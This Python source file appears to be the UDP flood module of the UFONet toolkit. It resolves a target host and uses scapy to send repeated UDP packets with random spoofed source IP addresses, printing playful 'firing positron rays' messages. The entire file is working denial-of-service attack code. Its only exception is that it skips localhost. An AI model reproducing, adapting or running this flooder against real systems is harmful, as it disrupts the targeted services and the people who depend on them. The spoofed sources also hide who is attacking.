#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    from scapy.all import *
except:
    print("\nError importing: scapy lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-scapy'\n")
    sys.exit(2)

# UFONet UDP flooder (UFOUDP)
def randIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = random.randint(1,65535) # TCP ports
    return x

def ufoudpize(ip, sport, rounds):
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            IP_p = IP()
            IP_p.src = randIP()
            try:
                IP_p.dst = ip
            except:
                print("[Error] [AI] [UFOUDP] Imposible to resolve IP from 'target' -> [Aborting!]\n")
                break
            try:
                send(IP_p/UDP(), verbose=0)
                print("[Info] [AI] [UFOUDP] Firing 'positron rays' ["+str(n)+"] -> [SHOOTING!]")
                time.sleep(1) # sleep time required for balanced sucess
            except:
                print("[Error] [AI] [UFOUDP] Failed to engage with 'positron rays' ["+str(n)+"]")
    except:
        print("[Error] [AI] [UFOUDP] Failing to engage... -> Is still target online? -> [Checking!]")

class UFOUDP(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] UDP (UFOUDP) is ready to fire: [" , rounds, "positron rays ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
            sport = 80
        elif target.startswith('https://'):
            target = target.replace('https://','')
            sport = 443
        try:
            ip = socket.gethostbyname(target)
        except:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                r.nameservers = ['8.8.8.8', '8.8.4.4'] # google DNS resolvers
                url = urlparse(target)
                a = r.query(url.netloc, "A") # A record
                for rd in a:
                    ip = str(rd)
            except:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [UFOUDP] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
            return
        ufoudpize(ip, sport, rounds) # attack with UFOUDP using threading
